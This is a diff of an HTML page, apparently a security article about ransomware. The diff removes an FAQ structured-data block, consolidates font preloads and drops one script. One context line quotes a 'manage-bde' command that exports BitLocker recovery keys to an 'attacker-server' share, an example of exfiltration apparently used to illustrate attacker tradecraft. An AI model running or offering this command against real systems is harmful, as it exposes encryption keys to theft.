@@ -83,34 +83,6 @@
       }]
     }
     </script>
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "FAQPage",
-      "mainEntity": [{
-        "@type": "Question",
-        "name": "What is ransomware and how does it work?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Ransomware is malicious software that encrypts files and demands payment for decryption. Attackers typically gain access through phishing emails, vulnerable RDP, or software exploits, then deploy encryption across the network."
-        }
-      }, {
-        "@type": "Question",
-        "name": "How can organizations protect against ransomware?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Key protections include regular backups, network segmentation, endpoint detection and response (EDR), email filtering, patch management, and security awareness training for employees."
-        }
-      }, {
-        "@type": "Question",
-        "name": "Should you pay the ransomware demand?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Security experts and law enforcement generally advise against paying ransoms as it funds criminal operations and doesn't guarantee data recovery. Focus on backup restoration and incident response instead."
-        }
-      }]
-    }
-    </script>
 
     <!-- Approved Brand Identity Favicon & App Icons -->
     <link rel="icon" href="/assets/brand/favicon/favicon.ico" sizes="any">
@@ -119,10 +91,7 @@
     <link rel="apple-touch-icon" href="/assets/brand/favicon/apple-touch-icon.png">
 
     <!-- Preload Critical Fonts -->
-    <link rel="preload" href="/fonts/inter-v18-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
-    <link rel="preload" href="/fonts/inter-v18-latin-600.woff2" as="font" type="font/woff2" crossorigin>
-    <link rel="preload" href="/fonts/inter-v18-latin-700.woff2" as="font" type="font/woff2" crossorigin>
-    <link rel="preload" href="/fonts/jetbrains-mono-v21-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/fonts/inter-variable.woff2" as="font" type="font/woff2" crossorigin>
     <link rel="stylesheet" href="/fonts.css">
 
     <!-- Canonical Site Chrome & Unified Editorial Article Stylesheet -->
@@ -1269,7 +1238,6 @@ manage-bde -protectors -get C: &gt; \\attacker-server\keys\%COMPUTERNAME%.txt</c
 <!-- SITE-FOOTER-END -->
 
     <!-- Core Site & Article Reader Scripts -->
-    <script src="/header-dropdown.min.js" defer></script>
     <script src="/command-palette.js" defer></script>
     <script src="/mobile-nav.js" defer></script>
     <script src="/theme-toggle.js" defer></script>
